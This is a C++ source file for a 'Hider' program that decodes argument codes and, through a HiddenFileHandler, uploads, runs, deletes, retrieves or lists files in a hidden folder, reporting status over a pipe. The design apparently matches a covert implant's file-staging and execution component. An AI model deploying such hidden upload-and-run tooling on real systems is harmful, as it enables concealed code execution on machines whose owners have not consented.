#include "Hider.h"


Hider::Hider() : handel(HiddenFileHandler()) {}



// argv[] = {fncode, uploadLen, strParam};
uint Hider::manage_files(int argc, char* argv[])
{
	std::string line;
	// std::cerr << "hider argc: " << argc << std::endl;
	// std::cerr << "hider argv[0]: " << argv[0] << std::endl;
	// std::cerr << "hider argv[1]: " << argv[1] << std::endl;
	// std::cerr << "hider argv[2]: " << argv[2] << std::endl;

	if (argc < 4) {
		return HIDER_NO_ARGUMENTS_ERROR;
	}
	uint32_t fncode = decodeInt(std::string(argv[0]));
	uint32_t uploadLen = decodeInt(std::string(argv[1]));
	std::string stringParam = decodeStr(std::string(argv[2]));
	std::string folderName = decodeStr(std::string(argv[3]));

	handel.setFolderName(folderName);
	// TODO better Status handling
	responce res_upload = {.dataLen = 0, .status = DID_NOTHING};
	responce res_run = {.dataLen = 0, .status = DID_NOTHING};
	responce res_delete = {.dataLen = 0, .status = DID_NOTHING};

	// std::cerr << "starting hidden action" << std::endl;
	if (fncode & HIDDEN_UPLOAD)
	{
		// std::cerr << "start hidden uploading\n";
		res_upload.status = handel.uploadFile(stringParam, uploadLen);
		std::cerr << "res_upload: " << res_upload.status << std::endl;
		std::cerr << "hider: " << strerror(errno) << std::endl;

	}
	if ((fncode & HIDDEN_RUN) && res_upload.status == SUCCSESS) {
		// std::cerr << "start hidden run\n";
		res_run.status = handel.runFile(stringParam);
		std::cerr << "res_run: " << res_run.status << std::endl;
	}

	if ((fncode & HIDDEN_DELETE) && res_upload.status == SUCCSESS) {
		// std::cerr << "start hidden delete\n";
		res_delete.status = handel.deleteFile(stringParam);
		std::cerr << "res_delete: " << res_delete.status << std::endl;
	}
	if (fncode & (HIDDEN_UPLOAD | HIDDEN_RUN | HIDDEN_DELETE))
	{
		write(OUTPUT_PIPE_FD, &res_upload, sizeof(res_upload));
		write(OUTPUT_PIPE_FD, &res_run, sizeof(res_run));
		write(OUTPUT_PIPE_FD, &res_delete, sizeof(res_delete));
	}

	if(fncode & HIDDEN_RETRIEVE_FILE) {
		handel.retreiveFile(stringParam);
	}

	if (fncode & HIDDEN_LIST) {
		handel.listFiles();
	}


	return EXIT_SUCCESS;
}


int main(int argc, char* argv[]) {
	// std::cerr << "start hider\n";
	Hider hider = Hider();	
	return hider.manage_files(argc, argv);
}

